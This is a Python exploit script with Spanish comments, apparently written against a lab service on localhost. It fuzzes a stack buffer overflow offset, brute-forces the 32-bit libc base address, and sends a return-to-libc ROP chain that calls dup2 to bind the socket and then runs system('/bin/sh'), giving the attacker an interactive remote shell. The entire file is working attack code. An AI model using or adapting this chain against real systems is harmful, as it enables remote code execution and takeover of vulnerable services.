import struct
import time
import socket
from pwn import *

HOST = "localhost"
PORT = 9999

def generar_direcciones_libc(base_start= 0xf7c00000, base_end=0xf7e00000, page_size=0x1000):
    return [addr for addr in range(base_start, base_end, page_size)]

def get_connection():
   sock=socket.socket()
   sock.connect((HOST,PORT))
   sock.settimeout(None)
   return sock

def interact_shell(sock):
    sys.stdout.flush()
    sock.settimeout(0.5)
    sock.send("whoami\n".encode())
    time.sleep(0.2)
    sys.stdout.write(sock.recv(4096).decode(errors='ignore'))
    while True:
        try:
            sys.stdout.flush()
            c = input("$ -> ")
            sock.send((c + '\n').encode())
            time.sleep(0.5)
            sys.stdout.write(sock.recv(4096).decode(errors='ignore'))
        except sock.timeout:
            continue
        except KeyboardInterrupt as e:
            print("quit")
            sock.close()
            break

def send_payload(payload_data: bytes):
    """
    Send payload to target server and receive response.
    Args:
        payload_data: The data to send to the target (bytes)
    """
    sock = get_connection()
    sock.settimeout(1)  # Set a timeout for the socket operations
    try:
       # Send payload
        sock.send(payload_data)
        # Receive response
        response = sock.recv(4096)
        if response:
            # print(f"Response: {response}")
            return True
    except socket.error as sock_error:
        print(f"Socket error: {sock_error}")
    finally:
        sock.close()
    return False

def calcular_offset():
    """
    Calculate the offset for the payload.
    """
    i = 1
    while True:
        print(f"Trying offset: {i}")
        PAYLOAD = b"A" * i
        RESPONSE = send_payload(PAYLOAD)
        if not RESPONSE:
            print(f"[+] GOT IT: offset = {i}")
            return i-1
        i += 1

def main():
    print("Starting exploit...")
    offset = calcular_offset()
    padding = b"B" * 8  # Padding hasta el EIP (nos saltamos EBP y EBX)
    libc = ELF("/lib32/libc.so.6", checksec=False)  # usa la misma que el servidor
    system_offset = libc.symbols["system"]
    exit_offset = libc.symbols["exit"]
    ls_command_offset = next(libc.search(b"/etc/shells")) + 0x9  #  Te quedas con el "ls" de shells para ejecutar el comando
    binsh_offset = next(libc.search(b"/bin/sh")) # Te quedas con el "/bin/sh" de shells para ejecutar el comando
    dup2_offset = libc.symbols["dup2"]
    gadget1_offset = 0x0001a879 #pop ebx; ret; Obtenido con ropshell
    gadget2_offset = 0x0007d34b # pop ebx; pop edx; ret; Obtenido con ropshell
    print(f"system_offset: {hex(system_offset)}")
    print(f"exit_offset: {hex(exit_offset)}")
    print(f"command_offset: {hex(ls_command_offset)}")

    libc_base_guesses = generar_direcciones_libc()

    print(f"Guesses: {len(libc_base_guesses)}")

    for idx, base in enumerate(libc_base_guesses):
        system = struct.pack("<I", (base + system_offset))
        exit_addr = struct.pack("<I", (base + exit_offset))
        ls_cmd = struct.pack("<I", (base + ls_command_offset))
        dup2_cmd = struct.pack("<I", (base + dup2_offset))
        binsh = struct.pack("<I", (base + binsh_offset))
        gadget1 = struct.pack("<I",(base + gadget1_offset))
        gadget2 = struct.pack("<I", (base +gadget2_offset ))

        # Payload para dos llamadas seguidas a system: primero 'ls', luego '/bin/sh'
        PAYLOAD = b"A" * offset
        PAYLOAD += padding
        PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(0)  # dup2(4, 0)
        PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(1)  # dup2(4, 1)
        PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(2)  # dup2(4, 2)
        PAYLOAD += system  + gadget1 + ls_cmd  # Llamada a system("ls") redirigido al socket
        PAYLOAD += system + exit_addr + binsh # Llamada a system ("/bin/sh") redirigido al socket

        sock = get_connection()
        sock.send(PAYLOAD)
        response = sock.recv(4096); # read banner
        if response:
            print(f"[+] Shell abierta en el intento {idx}. Iniciando shell interactiva...")
            interact_shell(sock)
            break;
        else:
            sock.close()

    print("[+] Finished wihout success")


if __name__ == "__main__":
    main()
    sys.exit(0)
